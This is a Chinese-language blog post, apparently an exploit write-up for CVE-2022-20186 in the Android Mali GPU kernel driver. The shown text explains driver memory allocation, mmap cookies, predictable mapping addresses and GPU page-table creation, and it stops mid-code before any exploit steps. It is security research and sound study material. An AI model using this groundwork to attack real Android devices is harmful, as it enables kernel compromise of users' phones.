<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="henry">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2024/12/02/cve-2022-20186/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="CVE-2022-20186 mali gpu	漏洞利用Mali GPU架构的命名灵感源自北欧神话，从 Utgard、Midgard、Bifrost 到最新的 Valhall。大多数现代安卓手机采用的是Bifrost或Valhall 架构，它们的内核驱动程序共享了大量代码。由于这些新架构在很大程度上基于 Midgard 架构，因此在 Bifrost 或 Valhall 驱动程序中有时会存在以“MI">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-20186 mali gpu	漏洞利用">
<meta property="og:url" content="http://example.com/2024/12/02/CVE-2022-20186/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="CVE-2022-20186 mali gpu	漏洞利用Mali GPU架构的命名灵感源自北欧神话，从 Utgard、Midgard、Bifrost 到最新的 Valhall。大多数现代安卓手机采用的是Bifrost或Valhall 架构，它们的内核驱动程序共享了大量代码。由于这些新架构在很大程度上基于 Midgard 架构，因此在 Bifrost 或 Valhall 驱动程序中有时会存在以“MI">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-19_23-51-35.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-20_16-34-11.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-28_15-53-56.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-29_18-23-59.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2024-12-02_16-48-48.png">
<meta property="article:published_time" content="2024-12-02T08:59:07.366Z">
<meta property="article:modified_time" content="2024-12-02T09:07:08.145Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="mali">
<meta property="article:tag" content="android gpu">
<meta property="article:tag" content="mem_alloc">
<meta property="article:tag" content="mem_alias">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Snipaste_2024-11-19_23-51-35.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/icon.png">
    <!--- Page Info-->
    
    <title>
        
            CVE-2022-20186 mali gpu	漏洞利用 -
        
        Henry Martin
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Henry Martin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories/"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/tags"  >
                                    
                                        
                                            <i class="fa-regular fa-tags"></i>
                                        
                                        TAGS
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/links/">LINKS
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories/"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/tags"  >
                             
                                
                                    <i class="fa-regular fa-tags"></i>
                                
                                TAGS
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/links/">LINKS</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/images/Snipaste_2024-12-02_16-48-48.png" alt="CVE-2022-20186 mali gpu	漏洞利用" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">CVE-2022-20186 mali gpu	漏洞利用</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/henry.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-12-02 16:59:07</span>
        <span class="mobile">2024-12-02 16:59:07</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-12-02 17:07:08</span>
            <span class="mobile">2024-12-02 17:07:08</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Android/">Android</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/Android/kernel/">kernel</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/Android/kernel/gpu/">gpu</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/mali/">mali</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/android-gpu/">android gpu</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/mem-alloc/">mem_alloc</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/mem-alias/">mem_alias</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="CVE-2022-20186-mali-gpu漏洞利用"><a href="#CVE-2022-20186-mali-gpu漏洞利用" class="headerlink" title="CVE-2022-20186 mali gpu	漏洞利用"></a>CVE-2022-20186 mali gpu	漏洞利用</h1><p>Mali GPU架构的命名灵感源自北欧神话，从 Utgard、Midgard、Bifrost 到最新的 Valhall。大多数现代安卓手机采用的是Bifrost或Valhall 架构，它们的内核驱动程序共享了大量代码。由于这些新架构在很大程度上基于 Midgard 架构，因此在 Bifrost 或 Valhall 驱动程序中有时会存在以“MIDGARD”为前缀的宏（例如MIDGARD_MMU_LEVEL）。</p>
<h2 id="Memory-management-in-the-Mali-kernel-driver"><a href="#Memory-management-in-the-Mali-kernel-driver" class="headerlink" title="Memory management in the Mali kernel driver"></a>Memory management in the Mali kernel driver</h2><p><strong>GPU与用户空间进程之间共享内存有多种方式</strong>，但在这里仅讨论由驱动程序管理共享内存的情况。在这种情况下，用户首先调用<a class="link" target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/google-modules/gpu/+/refs/tags/android-12.0.0_r0.42/mali_kbase/mali_kbase_mem_linux.c#292">KBASE_IOCTL_MEM_ALLOC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <code>ioctl</code>从<code>kbase_context</code>中分配页面。这些页面是从<code>kbase_context</code>中的每个上下文内存池 <code>mem_pools</code>中分配的，并且不会立即映射到GPU或用户空间。ioctl向用户返回一个<code>cookie</code>，该<code>cookie</code>随后被用作mmap设备文件的偏移量<code>offset</code>，并将这些<strong>页面映射到GPU和用户空间</strong>，当使用munmap取消内存映射时，支持页面会被回收回mem_pools。</p>
<p><a class="link" target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/google-modules/gpu/+/refs/tags/android-12.0.0_r0.42/mali_kbase/mali_kbase_defs.h#1747">Kbase_context <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p><code>kbase_context</code> 为用户空间应用程序与GPU交互定义了一个执行环境。每个与GPU交互的设备文件都有一个独立的 <code>kbase_context</code>。除此之外，<code>kbase_context</code> 还定义了它自己的GPU地址空间，并管理用户空间和GPU的内存共享</p>
</blockquote>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> kbase_va_region *<span class="title function_">kbase_mem_alloc</span><span class="params">(<span class="keyword">struct</span> kbase_context *kctx,</span></span><br><span class="line"><span class="params">                    u64 va_pages, u64 commit_pages,</span></span><br><span class="line"><span class="params">                    u64 extension, u64 *flags, u64 *gpu_va)</span></span><br><span class="line">{</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kbase_va_region</span> *<span class="title">reg</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    reg = kbase_alloc_free_region(rbtree, PFN_DOWN(*gpu_va),</span><br><span class="line">            va_pages, zone);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>

<p>该函数会创建一个 <code>kbase_ba_region</code> 对象去存储相关内存地址信息，同时该函数也会通过调用 <a class="link" target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/google-modules/gpu/+/refs/tags/android-12.0.0_r0.42/mali_kbase/mali_kbase_mem.c#2139">kbase_alloc_phy_pages <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 从 <code>kbase_context</code>的内存池 <code>mem_pool</code>中分配<code>backing pages</code>（可以理解我们申请的堆块）。</p>
<p>当从64位进程调用时，所创建的区域会存储在<code>kbase_context</code>的<code>pending_regions</code>中，而不是立即进行映射。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (*flags &amp; BASE_MEM_SAME_VA) {</span><br><span class="line">    ...</span><br><span class="line">    kctx-&gt;pending_regions[cookie_nr] = reg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* relocate to correct base */</span></span><br><span class="line">    cookie = cookie_nr + PFN_DOWN(BASE_MEM_COOKIE_BASE);</span><br><span class="line">    cookie &lt;&lt;= PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">    *gpu_va = (u64) cookie;</span><br><span class="line">}...</span><br></pre></td></tr></table></figure></div>

<p>上述代码中的 cookie 值将会返回给用户，该值将可以被用作 <code>mmap</code> 调用的 <code>offset</code> 参数，从而映射申请的内存空间给用户。</p>
<h3 id="Mapping-pages-to-user-space"><a href="#Mapping-pages-to-user-space" class="headerlink" title="Mapping pages to user space"></a><strong>Mapping pages to user space</strong></h3><p>了解在调用mmap映射该区域时虚拟地址是如何分配的这一点非常重要，这里简要介绍用户空间映射，当调用mmap时，会使用 <a class="link" target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/google-modules/gpu/+/refs/tags/android-12.0.0_r0.42/mali_kbase/thirdparty/mali_kbase_mmap.c#237">kbase_context_get_unmapped_area <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来找到一个空闲区域进行映射：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">kbase_context_get_unmapped_area</span><span class="params">(<span class="keyword">struct</span> kbase_context *<span class="type">const</span> kctx,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> pgoff, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> flags)</span></span><br><span class="line">{</span><br><span class="line">    ...</span><br><span class="line">    ret = kbase_unmapped_area_topdown(&amp;info, is_shader_code,</span><br><span class="line">            is_same_4gb_page);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>该调用不允许使用 <code>MAP_FIXED</code> 标志<strong>将内存映射到固定的虚拟地址</strong>。相反，使用 <code>kbase_unmapped_area_topdown</code> 来查找一个足够大以容纳所请求内存的空闲区域，并返回其地址，顾名思义，<code>kbase_unmapped_area_topdown</code> 返回的是可用的最高地址。</p>
<p>然后，将映射的地址存储为 <code>kbase_va_region</code> 中的 <code>start_pfn</code> 字段，从一定程度上这意味着<strong>连续映射区域的相对地址是可预测的</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">"/dev/mali0"</span>, O_RDWR);</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">kbase_ioctl_mem_alloc</span> <span class="title">alloc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">kbase_ioctl_mem_alloc</span> <span class="title">alloc2</span>;</span></span><br><span class="line">...</span><br><span class="line">ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc);</span><br><span class="line">ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc2);</span><br><span class="line"><span class="type">void</span>* region1 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, prot, MAP_SHARED, fd, alloc.out.gpu_va);</span><br><span class="line"><span class="type">void</span>* region2 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, prot, MAP_SHARED, fd, alloc2.out.gpu_va)</span><br></pre></td></tr></table></figure></div>

<p>这里 <code>region2</code> 的虚拟地址将会是 <code>region1-0x1000</code> 。</p>
<h3 id="Mapping-pages-to-the-GPU"><a href="#Mapping-pages-to-the-GPU" class="headerlink" title="Mapping pages to the GPU"></a>Mapping pages to the GPU</h3><p>每个<code>kbase_context</code>维护着自己的GPU地址空间，并管理自己的GPU页表。同时，每个<code>kbase_context</code>维护着一个<strong>四级页表</strong>，<strong>用于将GPU地址转换为支撑的物理页</strong>。它有一个<code>mmut</code>字段，用于<strong>存储作为pgd字段的顶级页表全局目录（PGD）</strong>。<code>mmut-&gt;pgd</code>被解释为512个元素的<code>int64_t</code>数组的页（512*8 = 4096B = 1KB），其条目指向存储下一级PGD的页帧，直到到达最底层，页表条目（PTE）存储<code>backing pages</code>（以及页面权限）。</p>
<p>由于大多数地址未被访问，PGD 和 PTE 只有在需要时才会被创建：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mmu_get_next_pgd</span><span class="params">(<span class="keyword">struct</span> kbase_device *kbdev,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> kbase_mmu_table *mmut,</span></span><br><span class="line"><span class="params">        <span class="type">phys_addr_t</span> *pgd, u64 vpfn, <span class="type">int</span> level)</span></span><br><span class="line">{</span><br><span class="line">    ...</span><br><span class="line">    p = pfn_to_page(PFN_DOWN(*pgd));</span><br><span class="line">    page = kmap(p);</span><br><span class="line">    ...</span><br><span class="line">    target_pgd = kbdev-&gt;mmu_mode-&gt;pte_to_phy_addr(page[vpfn]);   <span class="comment">//&lt;------- 1.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!target_pgd) {</span><br><span class="line">        target_pgd = kbase_mmu_alloc_pgd(kbdev, mmut);           <span class="comment">//&lt;------- 2.</span></span><br><span class="line">        ...</span><br><span class="line">        kbdev-&gt;mmu_mode-&gt;entry_set_pte(&amp;page[vpfn], target_pgd); <span class="comment">//&lt;------- 3.</span></span><br></pre></td></tr></table></figure></div>

<p>当一个访问需要特定的页全局目录（Page Global Directory，简称PGD）时，它会从上一级PGD（上述中的1）中查找条目。由于一个PGD的所有条目都被初始化为一个表示条目无效的特定值（magic value），如果之前从未访问过该条目，那么1将返回一个空指针（NULL pointer），这将导致为 <code>target_pgd</code>（上述中的2）分配内存。然后，将 <code>target_pgd</code>的地址作为条目添加到之前的PGD中（上述中的3）。</p>
<p><strong>注意事项</strong></p>
<p><code>backing target PGD</code>的页帧是通过全局 <code>kbase_device</code> <code> kbdev</code>的<code>mem_pools</code>分配的，而 <code>kbdev</code> 是一个所有上下文共享的全局内存池。</p>
<p>当映射内存给GPU时，<a class="link" target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/google-modules/gpu/+/refs/tags/android-12.0.0_r0.42/mali_kbase/mali_kbase_mem.c#1461">kbase_gpu_mmap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 将会调用<code>kbase_mmu_insert_pages</code> 添加 <code>backing pages</code>到 GPU 页表。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kbase_gpu_mmap</span><span class="params">(<span class="keyword">struct</span> kbase_context *kctx, <span class="keyword">struct</span> kbase_va_region *reg, u64 addr, <span class="type">size_t</span> nr_pages, <span class="type">size_t</span> align)</span></span><br><span class="line">{</span><br><span class="line">    ...</span><br><span class="line">    alloc = reg-&gt;gpu_alloc;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (reg-&gt;gpu_alloc-&gt;type == KBASE_MEM_TYPE_ALIAS) {</span><br><span class="line">      